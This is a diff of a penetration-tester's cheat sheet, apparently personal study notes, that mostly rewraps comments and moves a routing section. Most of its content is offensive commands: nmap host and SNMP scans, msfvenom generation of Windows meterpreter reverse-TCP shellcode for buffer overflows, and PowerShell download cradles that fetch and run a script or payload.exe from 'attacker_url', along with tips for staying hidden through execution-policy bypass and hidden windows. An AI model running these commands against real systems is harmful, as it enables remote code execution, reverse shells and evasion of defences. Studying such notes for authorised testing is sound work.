@@ -42,13 +42,25 @@ nmap -sn
 //also we can try running no ping to see any extra hosts hidden behind firewalls
 nmap -n -sn
 
-//we have hosts we can scan targets to check OS and service/version and run default scripts
+//Once we have hosts we can scan targets to check OS and service/version and run
+default scripts
 nmap -T4 -O -sV -sC
 
-//if all ports are filtered on a host be sure to check for openings on udp port 161/ (SNMP)
+//if all ports are filtered on a host be sure to check for openings on udp port
+161/ (SNMP)
 nmap -sU -p 161,162 
 
 
+
+# add/view routes
+
+route print  (Windows)
+
+route -v   (Linux)
+
+ip route add <targetIP> via <gateway>
+
+arp   (show the ARP cache)
 
 
 # Netcat commands
@@ -85,7 +97,7 @@ smbclient \\\\targetmachine\\some-share -U username
 
 
 
-# MSF Venom
+# MSF Venom/BufferOverflow
 
 //create starting payload for BOF -l specifes length/size
 msf-pattern_create -l <payloadsize>
@@ -95,17 +107,9 @@ msf-pattern_create -l <payloadsize>
 msf-pattern_offset -l <length> -q <EIP>
 
 
-//BOF shellcode // -b "\x00" specifies to remove all null bytes, any other bad bytes can be specified also
+//BOF shellcode // -b "\x00" specifies to remove all null bytes, any other bad
+bytes can be specified also
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f py -b "\x00"
-
-
-
-# add/view routes
-
-route print
-
-ip route add <targetIP> via <gateway>
-
 
 
 
@@ -136,10 +140,11 @@ enum4linux.pl -a <targetIP> | tee enum4linux.log
 
 # PowerShell
 
-// in memory download cradle. if using cmd prompt, use single quotes instead. This downloads and executes a
-remotely hosted PS script
+// in memory download cradle. if using cmd prompt, use single quotes instead
+This downloads and executes a remotely hosted PS script
 
 PS C:\> iex (New-Object Net.WebClient).DownloadString("http://attacker_url/script.ps1")
+
 
 //DownloadFile method. Do not use this if trying to remain stealthy. The local var is where the file will be
 saved to
@@ -149,12 +154,15 @@ PS C:\> $payload = "http://attacker_url/payload.exe"
 PS C:\> $local_file = "C:\programdata\payload.exe"
 PS C:\> $downloader.DownloadFile($payload,$local_file)
 
-//If trying to remain stealthy, also make sure to use the execution policy bypass and window hidden options
+
+//If trying to remain stealthy, also make sure to use the execution policy
+bypass and window hidden options
 
 C:\> powershell.exe -ExecutionPolicy Bypass -Window Hidden .\downloader.ps1
 
 
-//there is a powershell port-scanner script if needed in the offensive powershell folder
+//there is a powershell port-scanner script if needed in the offensive
+powershell folder
 
 
 
